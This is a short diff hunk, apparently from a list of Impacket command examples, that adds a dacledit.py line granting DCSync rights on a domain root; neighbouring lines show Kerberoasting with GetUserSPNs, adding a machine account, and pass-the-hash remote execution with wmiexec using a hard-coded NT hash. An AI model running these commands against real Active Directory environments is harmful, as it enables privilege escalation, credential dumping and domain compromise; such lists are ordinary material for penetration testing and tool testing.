@@ -26,6 +26,7 @@ GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/Administrator
 GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+dacledit.py -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
 wmiexec.py -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 wmiexec.py -k "$TARGET"
